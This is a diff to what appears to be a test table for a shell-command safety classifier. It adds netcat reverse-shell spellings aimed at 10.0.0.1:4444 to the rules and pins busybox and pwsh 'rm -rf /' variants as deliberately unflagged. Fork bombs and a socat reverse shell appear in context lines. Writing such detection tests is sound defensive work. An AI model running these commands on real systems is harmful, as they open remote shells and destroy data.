@@ -25,6 +25,11 @@ const RULES: ReadonlyArray<readonly [string, string]> = [
   ["git push origin +main", "force-push-protected"],
   ["git push --force origin HEAD:main", "force-push-protected"],
   ["nc -e /bin/sh 10.0.0.1 4444", "reverse-shell"],
+  // A bundled short flag carries the same meaning as the split spelling. `-c`
+  // alone pins its own membership: `-lec` also has `e`, so it would pass a set
+  // that had lost the `c`.
+  ["nc -lec /bin/sh 10.0.0.1 4444", "reverse-shell"],
+  ["nc -c /bin/sh 10.0.0.1 4444", "reverse-shell"],
   ["socat TCP:10.0.0.1:4444 EXEC:/bin/sh", "reverse-shell"],
   [":(){ :|:& };:", "fork-bomb"],
   ["bomb(){ bomb|bomb& }; bomb", "fork-bomb"],
@@ -183,6 +188,10 @@ const NEVER: readonly string[] = [
   "rm -rf $D",
   'rm -rf "$D"',
   "rm -rf / $X",
+  // Deliberately outside the set, pinned so a future addition is a decision,
+  // not an accident.
+  "busybox -c 'rm -rf /'",
+  "pwsh -c 'rm -rf /'",
   "ls /",
   "dd if=a.img of=out.img",
   "dd if=/dev/zero of=/dev/null",
